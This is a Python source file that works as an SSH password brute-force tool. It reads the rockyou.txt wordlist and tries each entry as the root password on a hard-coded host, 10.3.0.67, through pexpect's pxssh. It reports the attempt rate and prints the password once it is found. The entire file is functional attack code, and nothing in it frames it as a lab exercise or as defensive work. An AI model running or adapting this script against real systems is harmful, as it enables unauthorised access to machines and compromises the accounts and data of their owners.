import pexpect
from pexpect import pxssh
import time
import sys
from datetime import datetime

# Terminal colors for better readability
class Colors:
    BLUE = "\033[94m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    END = "\033[0m"

# Attempt SSH login
def attempt_login(host, user, password, delay=1):
    try:
        s = pxssh.pxssh(timeout=5)
        s.login(host, user, password)
        print(Colors.GREEN + f"[+] Success! Password found: {password}" + Colors.END)
        print(f"[SSH Command] ssh {user}@{host}")
        print(f"[Enter Password]: {password}")
        s.logout()
        return True
    except pxssh.ExceptionPxssh as e:
        print(Colors.RED + f"[-] Failed with: {password}" + Colors.END)
        return False
    finally:
        time.sleep(delay)  # Delay between attempts

# Main function
def main():


    # Static credentials
    target_host = "10.3.0.67"
    target_user = "root"
    password_file = "rockyou.txt"
    delay = 1.0  # Delay between attempts in seconds

    print(f"[*] Target: {target_user}@{target_host}")
    print(f"[*] Password file: {password_file}")
    print(f"[*] Delay: {delay} seconds")

    try:
        with open(password_file, "r", errors="ignore") as pf:
            attempts = 0
            start_time = datetime.now()

            print(f"[*] Starting brute force at {start_time}")

            for line in pf:
                password = line.strip()
                attempts += 1

                if attempts % 10 == 0:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    rate = attempts / elapsed if elapsed > 0 else 0
                    print(f"[*] Status: {attempts} attempts, {rate:.2f} attempts/sec")

                print(f"[*] Trying password ({attempts}): {password}")

                if attempt_login(target_host, target_user, password, delay):
                    print(Colors.BOLD + "[*] Brute-force successful!" + Colors.END)
                    break
            else:
                print(Colors.RED + "\n[-] No valid password found in the list." + Colors.END)

    except FileNotFoundError:
        print(Colors.RED + f"[!] Password file not found: {password_file}" + Colors.END)
        print("Please make sure rockyou.txt is in the same directory as this script.")
    except KeyboardInterrupt:
        print(Colors.RED + "\n[!] Interrupted by user." + Colors.END)
        elapsed = (datetime.now() - start_time).total_seconds()
        print(f"[*] Completed {attempts} attempts in {elapsed:.1f} seconds")
        sys.exit(0)
    except Exception as e:
        print(Colors.RED + f"[!] Error: {str(e)}" + Colors.END)

if __name__ == "__main__":
    main()
